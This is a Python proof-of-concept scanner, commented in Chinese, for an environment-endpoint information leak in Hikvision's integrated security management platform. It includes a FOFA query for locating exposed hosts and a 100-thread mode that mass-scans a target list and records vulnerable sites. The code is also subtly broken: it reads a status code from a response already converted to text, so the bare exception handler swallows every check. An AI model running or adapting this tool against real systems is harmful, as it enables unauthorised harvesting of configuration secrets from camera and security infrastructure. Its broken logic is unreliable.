# Hikvision综合安防管理平台env存在信息泄漏漏洞
# fofa:body="/portal/skin/isee/redblack/"

import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                        
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Hikvision综合安防管理平台env存在信息泄漏漏洞")
    parser.add_argument("-u", "--url",dest='url',type=str, help="Please input url")
    parser.add_argument("-f","--file",dest='file',type=str,help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()

def poc(target):
    payload_url = '/artemis-portal/artemis/env'
    url = target + payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if res.status_code == 200 and 'profiles' in res:
            print(f'[+]该url:{target}存在信息泄漏漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在信息泄漏漏洞')
        else:
            print(f'[-]该url:{target}不存在信息泄漏漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()